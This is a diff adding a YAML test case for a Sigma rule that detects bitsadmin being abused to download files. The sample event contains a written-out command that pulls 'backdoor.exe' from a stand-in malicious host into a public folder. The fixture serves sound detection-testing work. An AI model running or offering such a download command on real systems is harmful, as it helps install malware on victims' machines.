@@ -1,0 +1,19 @@
+test_case:
+  name: "BITSAdmin File Download"
+  description: "Tests detection of bitsadmin abuse for file download"
+  rule: "execution/bitsadmin_download.yml"
+  rule_type: sigma
+  events:
+    - type: process_create
+      os_type: windows
+      data:
+        path: "C:\\Windows\\System32\\bitsadmin.exe"
+        cmdline: "bitsadmin.exe /transfer evil http://malicious.com/backdoor.exe C:\\Users\\Public\\backdoor.exe"
+        parent_path: "C:\\Windows\\System32\\cmd.exe"
+        user: "WORKSTATION\\user"
+        pid: 9124
+        ppid: 2048
+  expected: match
+  expected_severity: medium
+  expected_mitre: ["T1197"]
+  tags: ["execution", "bitsadmin", "positive"]
